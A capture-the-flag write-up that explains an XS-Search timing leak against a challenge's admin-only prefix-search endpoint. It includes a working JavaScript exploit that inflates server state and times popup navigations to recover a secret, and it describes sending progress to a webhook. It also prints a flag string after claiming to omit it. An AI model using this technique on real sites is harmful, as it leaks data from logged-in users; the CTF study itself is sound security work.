# Leaky CTF Platform Revenge Revenge Revenge — Writeup

**Challenge:** Leaky CTF Platform Revenge Revenge Revenge  
**Category:** Web / XS-Leaks  
**Author:** siunam

---

## Summary

This challenge has two flags hidden behind two different layers:

1. A **stage-1 internal flag** in the format `leakyctf{XXXXXXXX}` where `XXXXXXXX` is 8 hex characters.
2. The **real flag** returned by `/submit_flag` after the correct stage-1 flag is submitted.

The intended solution is to use an **XS-Search timing leak** against the admin-only `/search` endpoint.

The core idea is:

- The bot gives us an **admin cookie on `localhost`**.
- The cookie is `SameSite=Lax`, so it is sent on **top-level cross-site navigations**.
- The endpoint `/search?flag=...` checks whether any stored flag starts with our input.
- The hidden correct flag is stored **first** in the list.
- The endpoint `/spam_flags` lets us fill the list with a huge number of fake flags.
- Therefore:
  - a **correct prefix** returns quickly because the first item matches immediately;
  - an **incorrect prefix** is slow because the server scans through a very large list.

That difference becomes a timing oracle.

---

## Source analysis

### 1. The secret state

From `config.py`:

```python
CORRECT_FLAG_PREFIX = 'leakyctf'
RANDOM_HEX_LENGTH = 4
CORRECT_FLAG = f'{CORRECT_FLAG_PREFIX}{{{secrets.token_hex(RANDOM_HEX_LENGTH)}}}'
```

`secrets.token_hex(4)` gives **8 hex characters**, so the hidden internal flag has the format:

```text
leakyctf{????????}
```

The real flag is only revealed by:

```python
return f'Correct! The real flag is: {config.REAL_FLAG}', 200
```

inside `/submit_flag`.

---

### 2. The admin-only search endpoint

From `app/__init__.py`:

```python
@app.route('/search')
def search():
    if request.cookies.get('admin_secret', '') != config.ADMIN_SECRET:
        return 'Access denied. Only admin can access this endpoint.', 403

    flag = request.args.get('flag', '')
    if not flag:
        return 'Invalid flag', 400

    foundFlag = any(f for f in flags if f.startswith(flag))
    if not foundFlag:
        return 'Your flag was not found in our key-value store.', 200

    return 'Your flag was found in our key-value store!', 200
```

Important points:

- `/search` is only usable with the correct `admin_secret` cookie.
- The stored flags live in the global list `flags`.
- The list is initialized as:

```python
flags = [config.CORRECT_FLAG]
```

So the **real stage-1 flag is always the first element**.

The actual check is prefix-based:

```python
any(f for f in flags if f.startswith(flag))
```

That means if we test `leakyctf{b`, the server answers “found” if the hidden flag starts with that prefix.

---

### 3. The flag inflation endpoint

```python
@app.route('/spam_flags')
@limiter.limit('1 per second')
def spamFlags():
    size = request.args.get('size', type=int, default=10)
    ...
    for _ in range(size):
        flags.append(f'{config.SIMUATION_FLAG_PREFIX}{{{secrets.token_hex(config.RANDOM_HEX_LENGTH)}}}')
```

This endpoint appends many fake flags such as:

```text
flag{1a2b3c4d}
```

Because the simulation prefix is `flag` instead of `leakyctf`, these fake entries will **not** match the prefixes we test.

So after calling `/spam_flags` many times:

- **Correct prefix:** the first element matches immediately.
- **Wrong prefix:** the server checks the first element, then keeps scanning through a huge number of fake entries.

That is exactly the intended timing gap.

---

### 4. Bot behavior

From `bot.py`:

```python
await context.add_cookies([{
    'name': 'admin_secret',
    'value': ADMIN_SECRET,
    'domain': BOT_CONFIG['APP_DOMAIN'],
    'path': '/',
    'httpOnly': True,
    'sameSite': 'Lax',
}])
```

and:

```python
BOT_CONFIG = {
    'APP_DOMAIN': 'localhost',
    'VISIT_DEFAULT_TIMEOUT_SECOND': 65,
    'VISIT_SLEEP_SECOND': 60
}
```

The bot:

1. sets the admin cookie for **`localhost`**;
2. visits our attacker page;
3. stays there for **60 seconds**.

Because the cookie is `SameSite=Lax`, it will not be sent on normal cross-site subresource requests, but it **will** be sent on a **top-level navigation** to `http://localhost:5000/...`.

That is why the exploit should use a popup or a new window that navigates to:

```text
http://localhost:5000/search?flag=...
```

instead of using `fetch()`.

---

## Intended attack path

The intended exploit chain is:

1. Host a malicious page on GitHub Pages.
2. Report that URL to the admin bot.
3. On the attacker page:
   - open a popup we control;
   - repeatedly navigate it to `http://localhost:5000/spam_flags?...` to enlarge the list;
   - then measure the timing for `http://localhost:5000/search?flag=<candidate>`.
4. Recover the internal flag one hex digit at a time.
5. Submit the recovered `leakyctf{...}` to `/submit_flag` manually in our own browser.
6. Read the real flag.

---

## Why `window.open()` is necessary

A common mistake is trying to call `/search` with `fetch()` or through an image tag.

That does not work reliably here because the admin cookie is `SameSite=Lax` and is scoped to `localhost`.

A **top-level navigation** is the intended way to make the browser attach the cookie.

So the exploit should do something like:

```js
const w = window.open('about:blank', 'probe');
w.location = 'http://localhost:5000/search?flag=leakyctf%7Bb';
```

The challenge is that we still cannot read the response body due to SOP.

Therefore, the solution is not response reading; it is **timing**.

---

## How to measure the timing

The most reliable method here is to use **cross-window timing**.

### Technique

1. Open a same-origin helper window first.
2. Confirm it is same-origin by touching `win.origin`.
3. Navigate it to the target `http://localhost:5000/search?...`.
4. Repeatedly probe `win.origin`.
5. As soon as the navigation commits to the cross-origin page, accessing `win.origin` throws.
6. The elapsed time becomes our timing sample.

In practice:

- a **correct prefix** yields a smaller commit time;
- a **wrong prefix** yields a larger commit time.

This was more reliable than waiting for popup `onload`, which can be unstable in headless browsing.

---

## Building the oracle

Assume the hidden flag is:

```text
leakyctf{b7c2e1aa}
```

We already know the fixed prefix:

```text
leakyctf{
```

Then we try all possible hex digits for the next character:

```text
leakyctf{0
leakyctf{1
...
leakyctf{f
```

The candidate with the **fastest** response is the correct next nibble.

Repeat this process 8 times.

Because of jitter, I used the following strategy:

- measure every candidate once;
- sort by time;
- if the fastest one is clearly ahead, accept it;
- otherwise re-test the top two candidates and compare medians.

This kept the exploit under the bot’s 60-second visit budget.

---

## Practical exploit strategy

### Step 1: Inflate the miss path

The list limit is large enough to make incorrect guesses expensive:

```python
MAX_FLAGS_LENGTH = 1_000_000
MAX_SPAM_FLAGS_LENGTH = 100_000
```

So we call:

```text
/spam_flags?size=100000
```

multiple times, waiting just over one second between requests because of the rate limit.

A good practical sequence is roughly 10 calls, which brings the list close to one million entries.

That makes the “wrong prefix” path noticeably slower.

---

### Step 2: Recover the stage-1 flag

For each unknown hex digit:

1. test all `0..f` candidates;
2. measure commit time;
3. pick the smallest timing;
4. send progress to a webhook so the result is not lost if the run stops early.

This is especially useful because the challenge note already says the intended solution may be unstable.

---

### Step 3: Redeploy with resume support

One problem is that 8 rounds plus inflation may be too close to the 60-second budget.

The fix is simple:

- after recovering a partial prefix such as `leakyctf{b7`, redeploy the same page with a query parameter like:

```text
?start=leakyctf%7Bb7&inflate=0
```

This lets us continue from the known prefix without refilling the list every time.

If the instance resets and loses the fake flags, run again with `inflate=1`.

---

## Exploit outline

Below is a simplified version of the final logic.

```html
<!doctype html>
<meta charset="utf-8">
<body>
<pre id="log"></pre>
<script>
const CHAL = 'http://localhost:5000';
const PUBLIC_CHAL = 'http://chal.polyuctf.com:47199';
const ALPHABET = '0123456789abcdef';
const START = 'leakyctf{';

const sleep = ms => new Promise(r => setTimeout(r, ms));
const log = (...x) => document.getElementById('log').textContent += x.join(' ') + '\n';

let probeWin = null;

async function waitUntilSameOrigin(w, timeoutMs = 3000) {
  const deadline = performance.now() + timeoutMs;
  while (performance.now() < deadline) {
    try {
      void w.origin;
      return;
    } catch {}
    await sleep(0);
  }
  throw new Error('same-origin helper timeout');
}

async function openProbe() {
  if (probeWin && !probeWin.closed) return probeWin;
  probeWin = window.open(location.origin + location.pathname + '?helper=1', 'probe');
  await waitUntilSameOrigin(probeWin);
  return probeWin;
}

async function resetProbe(w) {
  try {
    void w.origin;
    return;
  } catch {}
  w.location = location.origin + location.pathname + '?helper=1#' + Math.random();
  await waitUntilSameOrigin(w);
}

async function commitTime(url, timeout = 2500) {
  const w = await openProbe();
  await resetProbe(w);
  const start = performance.now();
  w.location = url;
  const deadline = start + timeout;
  while (performance.now() < deadline) {
    try {
      void w.origin;
    } catch {
      return performance.now() - start;
    }
    await sleep(0);
  }
  return timeout;
}

async function inflate() {
  for (let i = 0; i < 10; i++) {
    await commitTime(`${CHAL}/spam_flags?size=100000&_=${Math.random()}`);
    await sleep(1100);
  }
}

async function guessNext(prefix) {
  const scores = [];
  for (const ch of ALPHABET) {
    const t = await commitTime(`${CHAL}/search?flag=${encodeURIComponent(prefix + ch)}&_=${Math.random()}`);
    scores.push({ ch, t });
    log(prefix + ch, '=>', t.toFixed(1) + 'ms');
  }
  scores.sort((a, b) => a.t - b.t);
  return scores[0].ch;
}

async function recover() {
  let cur = START;
  for (let i = 0; i < 8; i++) {
    cur += await guessNext(cur);
    log('progress:', cur);
  }
  return cur + '}';
}

(async () => {
  await inflate();
  const stage1 = await recover();
  log('stage1:', stage1);
  log('open manually:', `${PUBLIC_CHAL}/submit_flag?flag=${encodeURIComponent(stage1)}`);
})();
</script>
```

The real exploit I used was slightly more optimized:

- it reused a single popup;
- it had resume support with `?start=...`;
- it could skip inflation with `?inflate=0`;
- it sent `stage1_progress` to a webhook.

---

## Why the webhook only needs the stage-1 flag

The prompt already hinted that:

- **GitHub Pages** is for hosting the exploit;
- **webhook.site** is only for receiving exfiltrated data.

The intended clean route is:

1. leak `leakyctf{xxxxxxxx}` to the webhook;
2. manually open:

```text
http://chal.polyuctf.com:47199/submit_flag?flag=leakyctf{xxxxxxxx}
```

3. read the real flag directly.

Trying to make the bot also read the final flag back to the webhook is unnecessary for the intended solve.

---

## Why this is the intended solution

Several details in the source strongly point to this path:

1. `/search` is prefix-based.
2. The hidden correct flag is stored first.
3. `/spam_flags` appends huge numbers of non-matching fake flags.
4. The bot grants us a `localhost` admin cookie.
5. The cookie is `SameSite=Lax`, which encourages navigation-based XS-Leaks.
6. The challenge note explicitly says the intended solution may be unstable.

That combination almost spells out a timing oracle.

Also, the browser is launched with:

```python
'--disable-features=LocalNetworkAccessChecks' # purely prevent unintended solution
```

which suggests the author was already thinking about unintended local-network style attacks and wanted the intended route to be a browser-side leak instead.

---

## Final solve flow

My final workflow was:

1. Host the exploit on GitHub Pages.
2. Report the GitHub Pages URL.
3. Let the bot visit the page.
4. Inflate the `flags` array.
5. Recover the stage-1 flag using timing.
6. If only a partial prefix is recovered, resume with `?start=...`.
7. Once `leakyctf{xxxxxxxx}` is known, open:

```text
http://chal.polyuctf.com:47199/submit_flag?flag=leakyctf{xxxxxxxx}
```

8. Receive the real flag.

---

## Lessons learned

This challenge is a neat example of how tiny implementation details become a full exploit chain:

- `startswith()` creates a prefix oracle;
- list ordering makes correct guesses fast;
- filler data amplifies the timing gap;
- `SameSite=Lax` enables navigation-based cookie sending;
- SOP blocks response reading but not timing.

Even though the solution is noisy and somewhat unstable, the vulnerability is conceptually clean: it is an **XS-Search timing leak amplified by attacker-controlled server state**.

---

## Flag

The final real flag depends on the instance, so I am omitting it here.

The important recoverable intermediate value is:

```text
leakyctf{????????}
```

After recovering it, submitting it to `/submit_flag` reveals the actual `PUCTF26{...}` flag.
PUCTF26{Please_do_not_use_an_unintended_solution_to_solve_this_challenge_xddd_HJsy2n2QZl5RKm4oH91XM4LlQgQRs6tw}

